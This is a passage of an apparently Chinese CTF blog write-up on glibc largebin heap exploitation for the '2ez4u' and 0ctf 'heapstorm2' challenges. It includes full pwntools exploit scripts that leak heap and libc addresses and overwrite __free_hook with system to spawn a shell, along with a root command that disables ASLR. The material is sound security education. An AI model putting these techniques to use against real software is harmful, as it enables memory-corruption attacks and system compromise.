class="code"><pre><span class="line"><span class="comment">#修改unsorted bin 的大小为0x50</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'Q'</span>*(<span class="number">8</span>+<span class="number">0x90</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x51</span>)+p64(libc_base+main_arena+<span class="number">88</span>)*<span class="number">2</span>+<span class="string">'a'</span>*<span class="number">0x30</span>+p64(<span class="number">0x50</span>)+p64(<span class="number">0x50</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#得到大小为0x50的chunk</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">'7'</span>)<span class="comment">#7 vuln</span></span><br><span class="line"><span class="comment">#删除0x60的chunk,从而利用heap地址最高位的0x56(成功)/0x55(失败)在arena中fastbin attack</span></span><br><span class="line">dele(<span class="number">9</span>)<span class="comment">#0x56 in arena</span></span><br><span class="line"><span class="comment">#造出fastbin</span></span><br><span class="line">dele(<span class="number">7</span>)</span><br><span class="line"><span class="comment">#fastbin dup</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'Q'</span>*(<span class="number">8</span>+<span class="number">0x90</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x51</span>)+p64(libc_base+main_arena+<span class="number">0x25</span>))</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">'7'</span>)<span class="comment">#7</span></span><br><span class="line">freehook = libc_base+libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">pay = <span class="string">'\x00'</span>*(<span class="number">0x23</span><span class="number">-0x18</span>)+p64(freehook<span class="number">-0xb58</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	add(<span class="number">0x30</span>,pay)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">	error(<span class="string">'unlucky 0x55 :('</span>)</span><br><span class="line">success(<span class="string">'lucky!! 0x56!!'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#靠近freehook</span></span><br><span class="line">add(<span class="number">0x3d0</span>,<span class="string">'\x00'</span>)</span><br><span class="line">add(<span class="number">0x3d0</span>,<span class="string">'\x00'</span>)</span><br><span class="line">add(<span class="number">0x300</span>,<span class="string">'\x00'</span>)</span><br><span class="line"><span class="comment"># 改写 freehook</span></span><br><span class="line">pay = <span class="string">'\x00'</span>*(<span class="number">0x50</span><span class="number">-0x20</span>)+p64(libc_base+libc.sym[<span class="string">'system'</span>])</span><br><span class="line">add(<span class="number">0x2e0</span>,pay)</span><br><span class="line"></span><br><span class="line"><span class="comment">#改写chunk 7的内容</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'Q'</span>*(<span class="number">8</span>+<span class="number">0x90</span>)+<span class="string">'X'</span>*<span class="number">0x10</span>+<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"><span class="comment">#system("/bin/sh")</span></span><br><span class="line">dele(<span class="number">7</span>)</span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure>
+<hr>
+<p>完整exp如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	cn = process(<span class="string">'./2ez4u'</span>)</span><br><span class="line">	<span class="comment">#bin = ELF('./2ez4u')</span></span><br><span class="line">	libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z</span><span class="params">(a=<span class="string">''</span>)</span>:</span></span><br><span class="line">	gdb.attach(cn,a)</span><br><span class="line">	<span class="keyword">if</span> a == <span class="string">''</span>:</span><br><span class="line">		raw_input()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(Len, con)</span>:</span></span><br><span class="line">	cn.recvuntil(<span class="string">'your choice:'</span>)</span><br><span class="line">	cn.sendline(<span class="string">'1'</span>)</span><br><span class="line">	cn.recvuntil(<span class="string">'color?(0:red, 1:green):'</span>)</span><br><span class="line">	cn.sendline(<span class="string">'0'</span>)</span><br><span class="line">	cn.recvuntil(<span class="string">'value?(0-999):'</span>)</span><br><span class="line">	cn.sendline(<span class="string">'0'</span>)</span><br><span class="line">	cn.recvuntil(<span class="string">'num?(0-16)'</span>)</span><br><span class="line">	cn.sendline(<span class="string">'0'</span>)</span><br><span class="line">	cn.recvuntil(<span class="string">'description length?(1-1024):'</span>)</span><br><span class="line">	cn.sendline(str(Len))</span><br><span class="line">	cn.recvuntil(<span class="string">'description of the apple:'</span>)</span><br><span class="line">	cn.sendline(con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">	cn.recvuntil(<span class="string">'your choice:'</span>)</span><br><span class="line">	cn.sendline(<span class="string">'2'</span>)</span><br><span class="line">	cn.recvuntil(<span class="string">'which?(0-15):'</span>)</span><br><span class="line">	cn.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, con)</span>:</span></span><br><span class="line">	cn.recvuntil(<span class="string">'your choice:'</span>)</span><br><span class="line">	cn.sendline(<span class="string">'3'</span>)</span><br><span class="line">	cn.recvuntil(<span class="string">'which?(0-15):'</span>)</span><br><span class="line">	cn.sendline(str(idx))</span><br><span class="line">	cn.recvuntil(<span class="string">'color?(0:red, 1:green):'</span>)</span><br><span class="line">	cn.sendline(<span class="string">'2'</span>)</span><br><span class="line">	cn.recvuntil(<span class="string">'value?(0-999):'</span>)</span><br><span class="line">	cn.sendline(<span class="string">'1000'</span>)</span><br><span class="line">	cn.recvuntil(<span class="string">'num?(0-16)'</span>)</span><br><span class="line">	cn.sendline(<span class="string">'17'</span>)</span><br><span class="line">	cn.recvuntil(<span class="string">'new description of the apple:'</span>)</span><br><span class="line">	cn.sendline(con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">	cn.recvuntil(<span class="string">'your choice:'</span>)</span><br><span class="line">	cn.sendline(<span class="string">'4'</span>)</span><br><span class="line">	cn.recvuntil(<span class="string">'which?(0-15):'</span>)</span><br><span class="line">	cn.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'0'</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'1'</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'2'</span>)</span><br><span class="line">add(<span class="number">0x3f0</span>,<span class="string">'3'</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'4'</span>)</span><br><span class="line">add(<span class="number">0x3e0</span>,<span class="string">'5'</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'6'</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'7'</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'8'</span>)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">'9'</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">dele(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">cn.recvuntil(<span class="string">'description:'</span>)</span><br><span class="line">heap = u64(cn.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x540</span></span><br><span class="line">success(<span class="string">'heap: '</span>+hex(heap))</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x10 3 head</span></span><br><span class="line"><span class="string">0x400 3 malloc</span></span><br><span class="line"><span class="string">0x10 4 head</span></span><br><span class="line"><span class="string">0x90 4 malloc</span></span><br><span class="line"><span class="string">0x10 5 head</span></span><br><span class="line"><span class="string">0x3f0 5 malloc</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#0xb8 bk_nextsize</span></span><br><span class="line"><span class="comment">#0xc0 'a'*0x300</span></span><br><span class="line"><span class="comment">#0x3c0 p64()*4</span></span><br><span class="line"><span class="comment">#0x3e0 fake 1</span></span><br><span class="line">pay = p64(heap+<span class="number">0x3e0</span>)</span><br><span class="line">pay += <span class="string">'a'</span>*<span class="number">0x300</span> </span><br><span class="line">pay += p64(<span class="number">0xdeadbeef</span>)+p64(heap+<span class="number">0x3e0</span>)+p64(heap+<span class="number">0x3e0</span>)+p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">pay += p64(<span class="number">0</span>)+p64(<span class="number">0x411</span>)+p64(heap+<span class="number">0x3b0</span>)+p64(heap+<span class="number">0x3c0</span>)+p64(heap+<span class="number">0x90</span>)+p64(heap+<span class="number">0x570</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,pay)</span><br><span class="line"></span><br><span class="line">pay = p64(heap+<span class="number">0x90</span>)</span><br><span class="line"><span class="comment">#0x540</span></span><br><span class="line">pay+= p64(<span class="number">0</span>)+p64(<span class="number">0x411</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(heap+<span class="number">0x3e0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">pay = pay.ljust(<span class="number">0x280</span>,<span class="string">'\x00'</span>)</span><br><span class="line">pay+=p64(<span class="number">0x410</span>)+p64(<span class="number">0x410</span>)</span><br><span class="line">edit(<span class="number">5</span>,pay)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x410</span><span class="number">-0x20</span>,<span class="string">'QQQQQQQQ'</span>)<span class="comment">#0</span></span><br><span class="line"><span class="comment">#recover</span></span><br><span class="line">edit(<span class="number">3</span>,p64(heap+<span class="number">0x540</span>))</span><br><span class="line">add(<span class="number">0x410</span><span class="number">-0x20</span>,<span class="string">'X'</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x400</span><span class="number">-0x20</span>,<span class="string">'Y'</span>)<span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">7</span>)<span class="comment">#970</span></span><br><span class="line">dele(<span class="number">4</span>)<span class="comment">#4a0</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'Q'</span>*(<span class="number">8</span>+<span class="number">0x90</span>)+<span class="string">'X'</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'4'</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">cn.recvuntil(<span class="string">'X'</span>*<span class="number">0x10</span>)</span><br><span class="line">main_arena=<span class="number">0x3c4b20</span></span><br><span class="line"></span><br><span class="line">libc_base = u64(cn.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))-main_arena<span class="number">-88</span></span><br><span class="line">success(<span class="string">'libc_base: '</span>+hex(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment">#recover</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'Q'</span>*(<span class="number">8</span>+<span class="number">0x90</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x51</span>)+p64(libc_base+main_arena+<span class="number">88</span>)*<span class="number">2</span>+<span class="string">'a'</span>*<span class="number">0x30</span>+p64(<span class="number">0x50</span>)+p64(<span class="number">0x50</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">'7'</span>)<span class="comment">#7 vuln</span></span><br><span class="line">dele(<span class="number">9</span>)<span class="comment">#0x55 in arena</span></span><br><span class="line">dele(<span class="number">7</span>)</span><br><span class="line"><span class="comment">#fastbin dup</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'Q'</span>*(<span class="number">8</span>+<span class="number">0x90</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x51</span>)+p64(libc_base+main_arena+<span class="number">0x25</span>))</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">'7'</span>)<span class="comment">#7</span></span><br><span class="line">freehook = libc_base+libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">pay = <span class="string">'\x00'</span>*(<span class="number">0x23</span><span class="number">-0x18</span>)+p64(freehook<span class="number">-0xb58</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	add(<span class="number">0x30</span>,pay)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">	error(<span class="string">'unlucky 0x55 :('</span>)</span><br><span class="line">success(<span class="string">'lucky!! 0x56!!'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x3d0</span>,<span class="string">'\x00'</span>)</span><br><span class="line">add(<span class="number">0x3d0</span>,<span class="string">'\x00'</span>)</span><br><span class="line">add(<span class="number">0x300</span>,<span class="string">'\x00'</span>)</span><br><span class="line">pay = <span class="string">'\x00'</span>*(<span class="number">0x50</span><span class="number">-0x20</span>)+p64(libc_base+libc.sym[<span class="string">'system'</span>])</span><br><span class="line">add(<span class="number">0x2e0</span>,pay)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'Q'</span>*(<span class="number">8</span>+<span class="number">0x90</span>)+<span class="string">'X'</span>*<span class="number">0x10</span>+<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">7</span>)</span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure>
+<p>ps.在PIE调试时,可以临时关闭aslr,但关闭aslr后heap地址最高位为0x55,fastbin那一步一定会失败<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure></p>
+<p>此外,之所以0x55会失败,0x56会成功的原因在<code>__libc_malloc</code>中,<br><img src="http://ordvwjm69.bkt.clouddn.com/largebin_89d292406b70f4ebee639b02c28054df.png" alt=""></p>
+<p>这里的v4是取出来的size位,<code>0x55</code>为<code>01010101</code>,<code>0x56</code>为<code>01010110</code></p>
+<hr>
+<h2 id="0ctf-heapstorm2"><a href="#0ctf-heapstorm2" class="headerlink" title="0ctf - heapstorm2"></a>0ctf - heapstorm2</h2><p>这题出的真的不错,后面largebin那一块的利用一气呵成,出题人水平很高(点赞</p>
+<p>首先,保护全开</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">===== HEAP STORM II =====</span><br><span class="line">1. Allocate</span><br><span class="line">2. Update</span><br><span class="line">3. Delete</span><br><span class="line">4. View</span><br><span class="line">5. Exit</span><br></pre></td></tr></table></figure>
+<p>程序一共有4个功能</p>
+<p>通过chunklist来管理,这个chunklist在init函数中初始化</p>
+<p><img src="http://ordvwjm69.bkt.clouddn.com/largebin_f17ef0470dafd92ef3dd9e8f59b05809.png" alt=""></p>
+<p><code>mallopt(M_MXFAST,0)</code>将<code>global_max_fast</code>设置为0,这个值的意思是最大为多大的chunk归fastbin管理,设置为0表示这个程序中不再存在fastbin.</p>
+<p><code>mmap_page</code>是一个固定的地址<code>0x13370000</code>,其中用于管理的chunklist在<code>0x13370800</code></p>
+<p>这个list最多能放16个obj,前面有4个random的QWORD,如图</p>
+<p><img src="http://ordvwjm69.bkt.clouddn.com/largebin_2d2086edf2a91594187bbaac86bc2335.png" alt=""></p>
+<p><code>RandNum_A</code>用于异或指针,<code>RandNum_B</code>用于异或size,两个<code>RandNum_C</code>默认是相同的,只有两者异或结果为<code>0x13377331</code>是才能使用<code>view</code>功能.</p>
+<p>再说说程序漏洞所在,这个漏洞挺好找的,在<code>update</code>函数中</p>
+<p><img src="http://ordvwjm69.bkt.clouddn.com/largebin_c41ed03f248338ba95628169f7efee0c.png" alt=""></p>
+<p>当我们达到长度max时,会溢出一个0字节,因此我们有了一个NULL byte off by one.<br>但是由于前面被盖成了<code>HEAPSTORM_II</code>,因此<code>prev_size</code>我们就无法控制了,因此不能使用比较简单的extend the chunk了,只能使用shrink the chunk.</p>
+<p>由于一开始没有view,也就没有leak,我们知道的地址就只剩下<code>0x13370000</code>这一个段了,本来我们可以使用smallbin的unlink去改chunklist,但是这题的chunklist上的所有指针都被异或了,因此chunklist上已经没有heap地址了,因此unlink是无法成功的.</p>
+<p>一开始我在考虑用unsorted bin attack,去改一个本来为空的obj的size,这样xor后的size就不为0,程序认为这个chunk存在,去update的时候,read的指针就变成了0,<code>read_n</code>函数没有报错,然后在后面有<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">read_n_leak(p, new_size);</span><br><span class="line">v3 = &amp;p[new_size];</span><br><span class="line">*(_QWORD *)v3 = 0x524F545350414548LL;         // HEAPSTORM_II</span><br><span class="line">*((_DWORD *)v3 + 2) = 0x49495F4D;</span><br><span class="line">v3[12] = 0;                                   // offbyone zero shrink the chunk</span><br><span class="line">return printf(&quot;Chunk %d Updated\n&quot;, (unsigned int)idx);</span><br></pre></td></tr></table></figure></p>
+<p>因为xor出来的size肯定很大,<code>new_size</code>我们就可以随便改,比如改成<code>0x13370800</code>,此时v3就变成了0+0x13370800,接着就会向0x13370800写入HEAPSTORM_II,但后来发现这样无法实现,因为他<code>read_int</code>只读入了8字节,读不了322373632(0x13370800)这么大,因此无法利用 : (</p>
+<p>接下来说正解</p>
+<p>fastbin 没法用,unlink缺少已知地址的堆指针也无法使用,unsortedbin attack考虑了一下貌似没法利用,house of force,house of orange也因此没有leak而无法使用,那么能想到的就只有largebin了.</p>
+<p>首先通过overlap,我们能够轻松的做出两个包在其他chunk里的largechunk,</p>
+<p>然后大的那个放到unsorted bin list中,小的那个放到largebin list 中</p>
+<p>修改在unsorted bin list的bin的bk,修改在largin bin list 中的bin的bk和bk_nextsize.</p>
+<p>接着malloc(0x48).我们的chunk就成功到了13370800上,中间发生了太多的事情,我们从源码开始看.</p>
+<p>首先到了这里,发现max fast为0,所以直接出去了</p>
+<p><img src="http://ordvwjm69.bkt.clouddn.com/largebin_f4c3b32f4da41303193bf687309cde09.png" alt=""></p>
+<p>然后到了这里,因为我们也没有smallbin,又直接出去了</p>
+<p><img src="http://ordvwjm69.bkt.clouddn.com/largebin_ae1a69a2103bce279a0c926645ff2d1a.png" alt=""></p>
+<p>然后到了这里,unsorted list中有我们放进去的较大的那个chunk,进入while循环</p>
+<p><img src="http://ordvwjm69.bkt.clouddn.com/largebin_33dda76b302781be8987ad449b695041.png" alt=""></p>
+<p>到这,但此时victim不是last_remainder,又直接出去了</p>
+<p><img src="http://ordvwjm69.bkt.clouddn.com/largebin_3558b71f33bb181412504c3a57708193.png" alt=""></p>
+<p>没办法,系统无法从unsorted 中割出一块给用户,所以按逻辑,系统把unsorted放到应该放的地方去,因为我们是largebin的大小,所以他进了最下面的那个分支</p>
+<p><img src="http://ordvwjm69.bkt.clouddn.com/largebin_65863b0f14e2150443f3b3f9c629d11a.png" alt=""></p>
+<p>此时我们largebin list中有一个largebin,而且size比unsorted小,因此unsorted 要插到合适的位置,</p>
+<p>从而触发了下面的几行代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">victim-&gt;fd_nextsize = fwd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;//bk_nextsize被构造</span><br><span class="line">fwd-&gt;bk_nextsize = victim;</span><br><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;//任意地址写堆地址</span><br><span class="line">        </span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;//任意地址写堆地址</span><br></pre></td></tr></table></figure>
+<p><img src="http://ordvwjm69.bkt.clouddn.com/largebin_eaee60b78f1a8b57ab78aa0d746a1034.png" alt=""></p>
+<p>其中fwd就是我们放在largebin list 中的chunk,他的bk和bk_nextsize都是我们可以通过overlap的chunk来修改的,因此我们可以像任意地址写两个堆地址,比如0x13370800上面一点,因为在pie下,程序地址随机后最高位只为0x55或是0x56,因此可以通过不对齐的方法利用这个0x56在0x13370800的上方构造一个size为0x50的fake chunk</p>
+<p>任意地址写完后,while循环没有结束,又回到开头</p>
+<p><img src="http://ordvwjm69.bkt.clouddn.com/largebin_33dda76b302781be8987ad449b695041.png" alt=""></p>
+<p>因此unsorted bin我们也是overlap的,因此他的bk我们可以改,将bk改到0x13370800上面那个fake chunk,一路走下来,发现size和nb一样大,fake chunk就被分配出去了</p>
+<p><img src="http://ordvwjm69.bkt.clouddn.com/largebin_61ce1562f412069f756564875a4b2ebb.png" alt=""></p>
+<p>接下来我们能修改RandNum_A~C,以及chunk0,</p>
+<p>把chunk0改到13370800,进一步修改,从而可以利用chunk1把之前写在13370800前面的堆地址leak出来,通过堆地址再leak libc,然后改指针任意地址写<code>__free_hook</code>,从而getshell.</p>
+<p>完整exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span 